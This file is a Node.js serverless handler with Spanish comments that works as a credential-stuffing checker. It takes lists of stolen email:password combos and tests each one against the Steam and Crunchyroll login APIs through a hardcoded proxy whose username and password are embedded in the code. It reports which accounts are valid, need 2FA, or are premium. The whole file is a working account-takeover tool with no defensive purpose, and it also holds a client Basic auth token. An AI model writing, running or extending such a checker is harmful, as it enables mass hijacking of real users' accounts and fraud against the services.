const axios = require('axios');
const crypto = require('crypto');
const forge = require('node-forge');
const { HttpsProxyAgent } = require('https-proxy-agent');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') return { statusCode: 200, headers, body: '' };
    if (event.httpMethod !== 'POST') return { statusCode: 405, headers, body: 'Method Not Allowed' };

    const proxies = [
        'http://poxweudy:pvma7be69xzy@45.38.107.97:6014'
        // Acá podés meter más proxies de otros países
    ];

    try {
        const { service, combos } = JSON.parse(event.body);
        const results = [];

        for (const combo of combos) {
            if (!combo.includes(':')) continue;
            const [email, password] = combo.split(':');

            // Elegimos un proxy al azar
            const proxyUrl = proxies[Math.floor(Math.random() * proxies.length)];
            const agent = new HttpsProxyAgent(proxyUrl);
            
            let isValid = false;
            let reason = 'Credenciales inválidas';

            if (service === 'steam') {
                try {
                    // 1. Steam necesita la llave RSA primero
                    const rsaRes = await axios.get(`https://store.steampowered.com/login/getrsakey/?username=${encodeURIComponent(email)}`, { httpsAgent: agent, timeout: 10000 });
                    
                    if (rsaRes.data && rsaRes.data.success) {
                        // 2. Encriptamos la contraseña
                        const pubKey = forge.pki.rsa.setPublicKey(
                            new forge.jsbn.BigInteger(rsaRes.data.publickey_mod, 16),
                            new forge.jsbn.BigInteger(rsaRes.data.publickey_exp, 16)
                        );
                        const encryptedPass = forge.util.encode64(pubKey.encrypt(password));

                        // 3. Mandamos el login
                        const loginRes = await axios.post('https://store.steampowered.com/login/dologin/', 
                            new URLSearchParams({
                                username: email,
                                password: encryptedPass,
                                rsatimestamp: rsaRes.data.timestamp,
                                remember_login: 'true'
                            }).toString(),
                            { 
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                httpsAgent: agent, 
                                timeout: 15000 
                            }
                        );

                        if (loginRes.data.success) {
                            isValid = true;
                            reason = 'Válida (Sin 2FA)';
                        } else if (loginRes.data.requires_twofactor) {
                            isValid = true;
                            reason = 'Válida (Pide 2FA)';
                        } else {
                            reason = loginRes.data.message || 'Credenciales inválidas';
                        }
                    }
                } catch (e) {
                    reason = 'Error de red/proxy';
                }
            } else {
                // Lógica de Crunchyroll (la que ya teníamos)
                const randomDeviceId = crypto.randomBytes(16).toString('hex');
                const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
                try {
                    const res = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
                        new URLSearchParams({
                            grant_type: 'password',
                            username: email, password: password, scope: 'offline_access',
                            device_id: randomDeviceId, device_name: randomDeviceName, device_type: 'samsung ' + randomDeviceName
                        }).toString(),
                        {
                            headers: {
                                'Authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': 'Crunchyroll/3.59.0 Android/14 okhttp/4.12.0'
                            },
                            httpsAgent: agent, timeout: 15000
                        }
                    );
                    if (res.status === 200 && res.data.access_token) {
                        const isPremium = res.data.scope.includes('mp offline_access');
                        isValid = true;
                        reason = isPremium ? 'PREMIUM' : 'FREE';
                    }
                } catch (e) {
                    reason = 'Credenciales inválidas (o bloqueo)';
                }
            }

            results.push({ email, valid: isValid, reason: reason });
        }
        return { statusCode: 200, headers, body: JSON.stringify({ results }) };
    } catch (e) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: e.message }) };
    }
};
